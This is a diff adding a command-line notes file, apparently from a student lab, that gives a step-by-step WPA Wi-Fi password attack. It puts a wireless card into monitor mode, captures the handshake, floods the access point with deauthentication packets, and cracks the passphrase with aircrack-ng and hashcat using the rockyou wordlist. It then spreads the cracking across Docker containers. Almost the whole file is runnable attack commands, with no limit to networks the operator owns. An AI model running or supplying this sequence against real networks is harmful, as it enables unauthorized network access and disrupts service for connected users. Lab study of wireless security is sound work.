@@ -1,0 +1,146 @@
+# PART 1: CATCH WPA HANDSHAKE AND FIND PASSWORD USING AIRCRACK, DICTIONARY ATTACK METHOD
+# Check wifi card driver
+iwconfig
+
+# Check service's confliction
+airmon-ng check
+
+# Kill service's confliction
+airmon-ng check kill
+
+# Start monitoring mode
+airmon-ng start wlan0
+
+# Recheck
+iwconfig
+
+# Monitoring overall
+airodump-ng wlan0mon
+
+# Note the BSSID and CHANNEL
+echo <bssid> > ap_bssid.txt
+echo <channel> > ap_ch.txt
+
+# Start monitoring and catch WPA handshake packet
+airodump-ng -w CrackMe --bssid $(cat ap_bssid.txt) -c $(cat ap_ch.txt) wlan0mon
+
+# Deauthenticate the AP
+aireplay-ng --deauth 0 -a $(cat ap_bssid.txt) wlan0mon
+
+# Get the system dictionary
+cp /usr/share/wordlists/rockyou.txt.gz
+gzip -d rockyou.txt.gz
+
+# Crack the password by using Aircrack
+aircrack-ng CrackMe-01.cap -w rockyou.txt
+
+
+
+# PART 2: FIND PASSWORD USING HASHCAT
+# Stop monitoring mode
+airmon-ng stop wlan0mon
+
+# Restart NetworkManager
+sudo systemctl start NetworkManager
+
+# Install hcxtools
+sudo apt update
+sudo apt install libssl-dev pkg-config libcurl4-openssl-dev
+git clone https://github.com/ZerBea/hcxtools.git
+cd hcxtools/
+sudo make -j $(nproc) install
+cd ..
+sudo rm -rf hcxtools/
+
+# Turn cap file to txt file
+hcxpcapngtool CrackMe-01.cap -o CrackMe-01-Hash.txt
+
+# Show hash codes
+hashcat --help
+
+# Start cracking using Hashcat
+hashcat -m 22000 CrackMe-01-Hash.txt rockyou.txt
+
+
+
+# PART 3: FIND PASSWORD USING DISTRIBUTED COMPUTING KNOWLEDGEMENT (DOCKER)
+# Create a folder for easy management
+mkdir crack_me
+mv * crack_me
+
+# Install Docker
+sudo apt install apt-transport-https ca-certificates curl software-properties-common
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
+sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
+sudo apt install docker-ce
+sudo usermod -aG docker ${USER}
+
+# Run a container from an image and execute into it
+docker run -it --name kalilinux kalilinux/kali-rolling:latest bash
+
+# Install sudo
+apt update
+apt install sudo
+
+# Create new user
+useradd -d /home/nhom13 -m -s /bin/bash nhom13
+passwd nhom13
+usermod -aG sudo nhom13
+su - nhom13
+
+# Install necessary tools
+sudo apt install aircrack-ng hashcat
+
+# Back to root
+logout
+
+# Back to main machine
+exit
+
+# Create an image from the container
+docker commit kalilinux worker:latest
+
+# Create a shared volume to store pcap, dictionary, hashcat things
+docker volume create crack_me
+
+# Create busybox
+docker run --rm -it --name busybox --user nhom13 --workdir /home/nhom13 --volume crack_me:/home/nhom13/crack_me worker:latest bash
+sudo chown nhom13:nhom13 crack_me/
+
+# Compress the crack_me folder
+tar -zcvf crack_me.tar.gz crack_me/
+
+# Copy data to shared volume
+docker cp crack_me.tar.gz busybox:/home/nhom13
+
+# On busybox, unzip decompress the file
+tar -zxvf crack_me.tar.gz
+
+# Remove unnecessary file
+rm crack_me.tar.gz
+
+# Get the prepared GitHub Repository stored bash scripts
+git clone https://github.com/votranphi/docker-aircrack-hashcat.git
+
+# Add the execution permission for 2 bash scripts
+cd docker-aircrack-hashcat
+chmod +x aircrack.sh
+chmod +x hashcat.sh
+
+# Run the prepared scripts (using aircrack)
+./aircrack.sh <number_of_containers>
+
+# Watch the containers' state
+docker ps -a
+
+# Print out the completed's container's log
+docker logs <completed_container_name>
+
+# Run the prepared scripts (using hashcat)
+./hashcat.sh <number_of_containers>
+
+# Watch the containers' state
+docker ps -a
+
+# Print out the completed's container's log
+docker logs <completed_container_name>
